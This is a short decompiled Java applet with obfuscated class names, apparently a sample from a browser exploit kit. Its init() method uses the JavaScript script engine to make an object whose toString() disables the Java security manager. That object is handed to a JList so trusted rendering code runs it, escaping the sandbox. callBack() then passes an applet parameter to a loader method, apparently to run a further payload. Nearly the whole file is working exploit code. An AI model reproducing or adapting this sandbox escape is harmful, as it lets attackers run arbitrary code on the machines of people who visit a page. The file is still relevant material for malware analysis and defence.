import javax.script.Bindings;
import javax.script.ScriptEngine;
import javax.script.ScriptException;
import java.awt.Component;
import javax.swing.JList;
import javax.script.ScriptEngineManager;
import java.applet.Applet;

// 
// Decompiled by Procyon v0.5.30
// 

public class M3GkZ906AkloBotA69 extends Applet
{
    @Override
    public void init() {
        try {
            System.out.println("OKKK");
            final ScriptEngine se = new ScriptEngineManager().getEngineByName("js");
            final Bindings b = se.createBindings();
            b.put("applet", (Object)this);
            final Object proxy = se.eval("this.toString = function(){   java.lang.System.setSecurityManager(null);    applet.callBack();};   var err = new Error('');   err.message = this;   err;", b);
            final JList list = new JList((E[])new Object[] { proxy });
            this.add(list);
        }
        catch (ScriptException ex) {
            ex.printStackTrace();
        }
    }
    
    public void callBack() {
        try {
            M3GkZ906AkloBotA70.amor(this.getParameter("class").toString());
            this.stop();
            this.destroy();
            System.exit(0);
        }
        catch (Exception exception) {
            exception.printStackTrace();
        }
    }
}
